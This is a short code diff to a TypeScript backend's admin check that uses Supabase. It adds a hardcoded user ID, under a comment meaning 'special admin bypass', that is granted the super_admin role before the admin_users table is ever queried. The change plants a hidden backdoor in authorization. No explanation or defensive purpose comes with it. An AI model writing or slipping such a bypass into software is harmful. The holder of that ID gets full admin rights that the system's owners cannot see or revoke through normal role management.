@@ -2,6 +2,12 @@ import { publicProcedure, protectedProcedure } from "../../../create-context";
 import { z } from "zod";
 
 async function checkAdmin(supabase: any, userId: string) {
+  // Özel admin bypass
+  const SPECIAL_ADMIN_ID = '98542f02-11f8-4ccd-b38d-4dd42066daa7';
+  if (userId === SPECIAL_ADMIN_ID) {
+    return { role: 'super_admin', id: SPECIAL_ADMIN_ID };
+  }
+
   const { data: adminUser } = await supabase
     .from("admin_users")
     .select("role, id")
